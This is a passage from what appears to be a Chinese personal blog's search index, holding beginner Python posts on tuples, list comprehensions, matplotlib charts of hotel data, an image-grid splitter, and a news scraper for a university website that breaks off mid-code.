<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将列表转换为元组</span></span><br><span class="line">list1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">tuple1 = <span class="built_in">tuple</span>(list1)</span><br><span class="line"><span class="built_in">print</span>(tuple1)  <span class="comment"># 输出: (1, 2, 3, 4, 5)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为元组</span></span><br><span class="line">string = <span class="string">&quot;hello&quot;</span></span><br><span class="line">tuple2 = <span class="built_in">tuple</span>(string)</span><br><span class="line"><span class="built_in">print</span>(tuple2)  <span class="comment"># 输出: (&#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将另一个元组转换为元组（实际上是创建了一个新的元组）</span></span><br><span class="line">tuple3 = <span class="built_in">tuple</span>((<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>))</span><br><span class="line"><span class="built_in">print</span>(tuple3)  <span class="comment"># 输出: (7, 8, 9)</span></span><br></pre></td></tr></table></figure></div>

<p><code>tuple()</code> 函数的作用是不可变序列的创建。元组是一种不可变的数据结构，一旦创建就无法修改。因此，当你需要一个不可变的数据结构来存储一组元素时，可以使用元组，并且 <code>tuple()</code> 函数提供了一种方便的方法来创建元组。</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>语法</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实现九宫格切割图片</title>
    <url>/posts/3d80d4a2.html</url>
    <content><![CDATA[<h4 id="克隆本项目"><a href="#克隆本项目" class="headerlink" title="克隆本项目"></a>克隆本项目</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/W1ndys/1to9-image.git</span><br></pre></td></tr></table></figure></div>

<p>然后可以看到项目文件夹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Python/1-to-9/image-20231204220532722.png"
                      alt="image-20231204220532722"
                ></p>
<h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><ol>
<li>把需要分割的图片复制进文件夹并且命名为 <code>input_image.jpg</code></li>
<li>在当前目录进命令行执行 <code>python 1.py</code></li>
<li>看到输出回显之后找 <code>output</code>文件夹就行</li>
</ol>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>本项目适用于长宽一致的正方形图片，分割最佳效果</p>
<p>其余比例不适合使用本项目</p>
<p>非常适合朋友圈九宫格切图</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python小工具</tag>
        <tag>Python脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Python中的列表推导式</title>
    <url>/posts/b46ab514.html</url>
    <content><![CDATA[<h1 id="Python-中的列表推导式"><a href="#Python-中的列表推导式" class="headerlink" title="Python 中的列表推导式"></a>Python 中的列表推导式</h1><p>列表推导式是一种用来简洁地创建列表的方法，在 Python 中有几种写法。以下是常见的列表推导式写法：</p>
<ol>
<li><p><strong>基本形式：</strong></p>
<p>基本形式的列表推导式由一个表达式和一个可迭代对象组成。对于可迭代对象中的每个元素，表达式都会被应用，并将结果添加到新列表中。</p>
<p><strong>例子：</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将列表中的每个元素加1生成新的列表</span></span><br><span class="line">original_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">new_list = [x + <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> original_list]</span><br><span class="line"><span class="built_in">print</span>(new_list)  <span class="comment"># 输出: [2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>带有条件判断的形式：</strong></p>
<p>带有条件判断的列表推导式在基本形式的基础上添加了一个条件表达式。只有当条件为真时，才会应用表达式并将结果添加到新列表中。</p>
<p><strong>例子：</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将列表中大于3的元素加1生成新的列表</span></span><br><span class="line">original_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">new_list = [x + <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> original_list <span class="keyword">if</span> x &gt; <span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(new_list)  <span class="comment"># 输出: [5, 6]</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>多重循环的形式：</strong></p>
<p>多重循环的列表推导式包含多个 <code>for</code> 子句，用于迭代多个可迭代对象的元素，并生成新列表。</p>
<p><strong>例子：</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成两个列表的笛卡尔积</span></span><br><span class="line">list1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">list2 = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">cartesian_product = [(x, y) <span class="keyword">for</span> x <span class="keyword">in</span> list1 <span class="keyword">for</span> y <span class="keyword">in</span> list2]</span><br><span class="line"><span class="built_in">print</span>(cartesian_product)  <span class="comment"># 输出: [(&#x27;a&#x27;, 1), (&#x27;a&#x27;, 2), (&#x27;b&#x27;, 1), (&#x27;b&#x27;, 2)]</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>带有条件判断和多重循环的形式：</strong></p>
<p>在多重循环的基础上，带有条件判断的列表推导式可以在每个循环中添加条件表达式，以过滤元素。</p>
<p><strong>例子：</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成列表中每个元素的平方，但只保留偶数的平方</span></span><br><span class="line">original_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">new_list = [x ** <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> original_list <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(new_list)  <span class="comment"># 输出: [4, 16]</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>嵌套列表推导式：</strong></p>
<p>嵌套列表推导式允许在一个列表推导式中嵌套另一个列表推导式，用于生成嵌套列表。</p>
<p><strong>例子：</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成一个包含两个子列表的嵌套列表</span></span><br><span class="line">outer_list = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]]</span><br><span class="line">flattened_list = [x <span class="keyword">for</span> sublist <span class="keyword">in</span> outer_list <span class="keyword">for</span> x <span class="keyword">in</span> sublist]</span><br><span class="line"><span class="built_in">print</span>(flattened_list)  <span class="comment"># 输出: [1, 2, 3, 4, 5, 6]</span></span><br></pre></td></tr></table></figure></div></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
        <category>语法</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实验——数据分析之matplotlib</title>
    <url>/posts/f73f64dd.html</url>
    <content><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">plt.rcParams[<span class="string">&quot;font.sans-serif&quot;</span>] = [<span class="string">&quot;SimHei&quot;</span>]</span><br><span class="line">plt.rcParams[<span class="string">&quot;axes.unicode_minus&quot;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 y = x^2 + 2x + 1 的图像</span></span><br><span class="line">x = np.linspace(-<span class="number">5</span>, <span class="number">3</span>, <span class="number">100</span>)</span><br><span class="line">y = x**<span class="number">2</span> + <span class="number">2</span> * x + <span class="number">1</span></span><br><span class="line">plt.plot(x, y, <span class="string">&quot;b--&quot;</span>, label=<span class="string">&quot;$y=x^&#123;2&#125;+2x+1$&quot;</span>)</span><br><span class="line">plt.axvline(x=-<span class="number">1</span>, color=<span class="string">&quot;r&quot;</span>, linestyle=<span class="string">&quot;--&quot;</span>, linewidth=<span class="number">2.5</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;x&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;y&quot;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制 sin(x) 和 cos(x) 的子图</span></span><br><span class="line">x = np.linspace(-<span class="number">3.14</span>, <span class="number">3.14</span>, <span class="number">100</span>)</span><br><span class="line">y1 = np.sin(x)</span><br><span class="line">y2 = np.cos(x)</span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">plt.plot(x, y1, <span class="string">&quot;b&quot;</span>, linewidth=<span class="number">2.5</span>)</span><br><span class="line">plt.title(<span class="string">&quot;$sinx$&quot;</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">plt.plot(x, y2, <span class="string">&quot;r--&quot;</span>, linewidth=<span class="number">2.5</span>)</span><br><span class="line">plt.title(<span class="string">&quot;$cosx$&quot;</span>)</span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取酒店数据并绘制柱状图</span></span><br><span class="line">df = pd.read_excel(<span class="string">&quot;酒店数据2.xlsx&quot;</span>, index_col=<span class="number">0</span>)</span><br><span class="line">data = df[<span class="string">&quot;地区&quot;</span>].value_counts()</span><br><span class="line">x = data.index</span><br><span class="line">y = data.values</span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.bar(x, y, color=<span class="string">&quot;g&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;每个地区酒店数量&quot;</span>, fontsize=<span class="number">20</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;地区&quot;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;酒店数量&quot;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line">plt.xticks(rotation=<span class="number">45</span>)</span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x, y):</span><br><span class="line">    plt.text(a, b + <span class="number">3</span>, b, ha=<span class="string">&quot;center&quot;</span>, va=<span class="string">&quot;bottom&quot;</span>, fontsize=<span class="number">10</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 价格等级的柱状图和饼图</span></span><br><span class="line">data2 = df[<span class="string">&quot;等级&quot;</span>].value_counts()</span><br><span class="line">x = data2.index</span><br><span class="line">y = data2.values</span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.bar(x, y, color=<span class="string">&quot;g&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;各个价格等级占比&quot;</span>, fontsize=<span class="number">20</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;价格等级&quot;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;酒店数量&quot;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line">plt.xticks(rotation=<span class="number">45</span>)</span><br><span class="line">plt.show()</span><br><span class="line">plt.pie(y, labels=x, autopct=<span class="string">&quot;%1.1f%%&quot;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 酒店评分的直方图</span></span><br><span class="line">plt.hist(df[<span class="string">&quot;评分&quot;</span>], bins=<span class="number">10</span>, edgecolor=<span class="string">&quot;black&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&quot;酒店评分直方图&quot;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&quot;评分&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;频数&quot;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保使用正确的列名来计算评分均值</span></span><br><span class="line">df[<span class="string">&quot;评分均值&quot;</span>] = df.groupby(<span class="string">&quot;等级&quot;</span>)[<span class="string">&quot;评分&quot;</span>].transform(<span class="string">&quot;mean&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照评分均值排序</span></span><br><span class="line">sorted_df = df[[<span class="string">&quot;等级&quot;</span>, <span class="string">&quot;评分均值&quot;</span>]].drop_duplicates().sort_values(by=<span class="string">&quot;评分均值&quot;</span>)</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">10</span>, <span class="number">6</span>))  <span class="comment"># 设置图片大小</span></span><br><span class="line">plt.bar(sorted_df[<span class="string">&quot;等级&quot;</span>], sorted_df[<span class="string">&quot;评分均值&quot;</span>], color=<span class="string">&quot;b&quot;</span>)  <span class="comment"># 绘制柱状图</span></span><br><span class="line"></span><br><span class="line">plt.title(<span class="string">&quot;每个价格等级酒店评分均值&quot;</span>, fontsize=<span class="number">20</span>)  <span class="comment"># 设置标题</span></span><br><span class="line">plt.xlabel(<span class="string">&quot;等级&quot;</span>, fontsize=<span class="number">18</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;评分均值&quot;</span>, fontsize=<span class="number">18</span>)  <span class="comment"># 对横纵轴进行说明</span></span><br><span class="line">plt.xticks(rotation=<span class="number">45</span>)  <span class="comment"># 标签转90度</span></span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-a415d2f26f7bdda9ea7a41bca004184b.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-eae1c71d796e8557db45c8561a6eeb20.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-a9f33eeddfb238d4dc982c29914ebb2b.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-26289929eb484776239311a94288eff8.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-a73b87205f95efbed50c34dfa546cbcb.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-6b8548cb121f8c0cbf0dfbdc194d33e5.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-8374954247c4328c04362909b15d02b0.png"
                      alt="img"
                ></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实验——曲阜师范大学新闻内容爬取</title>
    <url>/posts/6d67d75.html</url>
    <content><![CDATA[<h2 id="心得体会（随便说几句）"><a href="#心得体会（随便说几句）" class="headerlink" title="心得体会（随便说几句）"></a>心得体会（随便说几句）</h2><p>核心就是利用 requests 和 BeautifulSoup 库，通过定位标签来获取新闻内容。</p>
<p>其实关键点就在于定位标签，通过观察网页源码，可以发现新闻内容和标题等都是在一个个的 <code>div</code> 标签中，因此我们可以通过 <code>find</code> 方法来定位这些标签，然后通过 <code>find_all</code> 方法来获取所有符合条件的标签。</p>
<p>灵活运用 <code>print</code> 语句，方便调试，慢慢就写出来了。</p>
<p>还有个问题就是，获取到的链接是形如 <code>../</code> 的相对链接，需要进行转换再进行拼接，可以用切片或者 <code>replace</code> 方法来实现。</p>
<p>还遇到一个问题就是，浏览器 F12 看到的标签和网页源码中的标签有时候会不一致，这里需要 <code>print</code> 调试才能找到正确的标签。</p>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scrape_news</span>(<span class="params">url</span>):</span><br><span class="line"></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    response.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="comment"># 定位body</span></span><br><span class="line">    body = soup.body</span><br><span class="line">    <span class="keyword">if</span> body <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 定位div</span></span><br><span class="line">        div = body.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;wrap&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> div <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 定位div</span></span><br><span class="line">            div_container = div.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;container clearfix&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> div_container <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># 定位li</span></span><br><span class="line">                div_pull_right = div_container.find(</span><br><span class="line">                    <span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;pull-right list-right&quot;</span></span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">if</span> div_pull_right <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># 定位lb-ul</span></span><br><span class="line">                    lb_ul = div_pull_right.find(<span class="string">&quot;ul&quot;</span>, class_=<span class="string">&quot;lb-ul&quot;</span>)</span><br><span class="line">                    <span class="keyword">if</span> lb_ul <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="comment"># 定位li</span></span><br><span class="line">                        li = lb_ul.find_all(<span class="string">&quot;li&quot;</span>)</span><br><span class="line">                        result = <span class="string">&quot;&quot;</span></span><br><span class="line">                        <span class="keyword">for</span> item <span class="keyword">in</span> li:</span><br><span class="line">                            title = item.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;lb-ul-tt txt-elise&quot;</span>).text</span><br><span class="line">                            date = item.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;lb-ul-date&quot;</span>).text</span><br><span class="line">                            content = item.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;lb-ul-p&quot;</span>).text</span><br><span class="line">                            link = item.find(<span class="string">&quot;a&quot;</span>, class_=<span class="string">&quot;clearfix img-hide&quot;</span>).get(</span><br><span class="line">                                <span class="string">&quot;href&quot;</span></span><br><span class="line">                            )</span><br><span class="line">                            link = (</span><br><span class="line">                                <span class="string">f&quot;https://www.qfnu.edu.cn<span class="subst">&#123;link[<span class="number">2</span>:].replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)&#125;</span>&quot;</span></span><br><span class="line">                            )</span><br><span class="line">                            result += <span class="string">f&quot;标题: <span class="subst">&#123;title&#125;</span>\n日期: <span class="subst">&#123;date&#125;</span>\n内容: <span class="subst">&#123;content&#125;</span>\n链接: <span class="subst">&#123;link&#125;</span>\n\n&quot;</span></span><br><span class="line">                        <span class="keyword">return</span> result</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;未找到 class 为 &#x27;lb-ul&#x27; 的 ul，获取到的值是：<span class="subst">&#123;lb_ul&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&quot;未找到 class 为 &#x27;pull-right list-right&#x27; 的 div，获取到的值是：<span class="subst">&#123;div_pull_right&#125;</span>&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;未找到 class 为 &#x27;container clearfix&#x27; 的 div，获取到的值是：<span class="subst">&#123;div_container&#125;</span>&quot;</span></span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;未找到 class 为 &#x27;wrap&#x27; 的 div，获取到的值是：<span class="subst">&#123;div&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未找到 body，获取到的值是：<span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取新闻页数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_news_page_count</span>(<span class="params">url</span>):</span><br><span class="line"></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    response.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="comment"># 定位body</span></span><br><span class="line">    body = soup.body</span><br><span class="line">    <span class="keyword">if</span> body <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 定位div</span></span><br><span class="line">        div = body.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;wrap&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> div <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 定位div</span></span><br><span class="line">            div_container = div.find(<span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;container clearfix&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> div_container <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="comment"># 定位div</span></span><br><span class="line">                div_pull_right = div_container.find(</span><br><span class="line">                    <span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;pull-right list-right&quot;</span></span><br><span class="line">                )</span><br><span class="line">                <span class="comment"># print(div_pull_right)</span></span><br><span class="line">                <span class="keyword">if</span> div_pull_right <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># 定位div</span></span><br><span class="line">                    div_page_box = div_pull_right.find(</span><br><span class="line">                        <span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;page-box text-center wow fadeInUp&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="keyword">if</span> div_page_box <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        div_pb_sys_common = div_page_box.find(</span><br><span class="line">                            <span class="string">&quot;div&quot;</span>, class_=<span class="string">&quot;pb_sys_common&quot;</span></span><br><span class="line">                        )</span><br><span class="line">                        <span class="keyword">if</span> div_pb_sys_common <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                            span_p_pages = div_pb_sys_common.find(</span><br><span class="line">                                <span class="string">&quot;span&quot;</span>, class_=<span class="string">&quot;p_pages&quot;</span></span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">if</span> span_p_pages <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                                span_p_no = span_p_pages.find(<span class="string">&quot;span&quot;</span>, class_=<span class="string">&quot;p_no&quot;</span>)</span><br><span class="line">                                <span class="keyword">if</span> span_p_no <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                                    a = span_p_no.find(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">                                    <span class="keyword">if</span> a <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                                        <span class="keyword">return</span> <span class="built_in">int</span>(</span><br><span class="line">                                            a.get(<span class="string">&quot;href&quot;</span>)</span><br><span class="line">                                            .replace(<span class="string">&quot;.htm&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                                            .replace(<span class="string">&quot;xxyw/&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                                        )</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(</span><br><span class="line">                                <span class="string">f&quot;未找到 class 为 &#x27;pb_sys_common&#x27; 的 div，获取到的值是：<span class="subst">&#123;div_pb_sys_common&#125;</span>&quot;</span></span><br><span class="line">                            )</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">f&quot;未找到 class 为 &#x27;page-box text-center wow fadeInUp animated&#x27; 的 div，获取到的值是：<span class="subst">&#123;div_page_box&#125;</span>&quot;</span></span><br><span class="line">                        )</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&quot;未找到 class 为 &#x27;pull-right list-right&#x27; 的 div，获取到的值是：<span class="subst">&#123;div_pull_right&#125;</span>&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;未找到 class 为 &#x27;container clearfix&#x27; 的 div，获取到的值是：<span class="subst">&#123;div_container&#125;</span>&quot;</span></span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;未找到 class 为 &#x27;wrap&#x27; 的 div，获取到的值是：<span class="subst">&#123;div&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未找到 body，获取到的值是：<span class="subst">&#123;body&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存为txt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_to_txt</span>(<span class="params">data, filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;即将开始爬取新闻首页&quot;</span>)</span><br><span class="line"></span><br><span class="line">news_index = scrape_news(<span class="string">&quot;https://www.qfnu.edu.cn/news/xxyw.htm&quot;</span>)</span><br><span class="line">save_to_txt(news_index, <span class="string">&quot;news_index.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;新闻首页爬取完成&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;即将开始爬取新闻第二页及以后&quot;</span>)</span><br><span class="line"></span><br><span class="line">page_count = get_news_page_count(<span class="string">&quot;https://www.qfnu.edu.cn/news/xxyw.htm&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> page_count:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;获取到的新闻页数为：<span class="subst">&#123;page_count&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未获取到新闻页数&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> page_count &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(page_count, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;即将爬取第 <span 